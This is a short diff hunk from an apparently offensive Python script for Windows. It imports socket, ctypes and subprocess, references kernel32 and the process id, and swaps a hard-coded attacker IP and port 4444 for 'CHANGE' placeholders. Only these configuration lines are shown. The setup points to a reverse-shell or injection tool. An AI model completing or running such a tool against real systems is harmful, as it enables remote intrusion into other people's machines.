@@ -3,8 +3,8 @@ import socket
 import ctypes
 import subprocess
 
-ATTACKER_IP = "192.168.0.109"  
-ATTACKER_PORT = 4444     
+ATTACKER_IP = "CHANGE"  
+ATTACKER_PORT = CHANGE   
 
 kernel32 = ctypes.windll.kernel32
 pid = os.getpid()
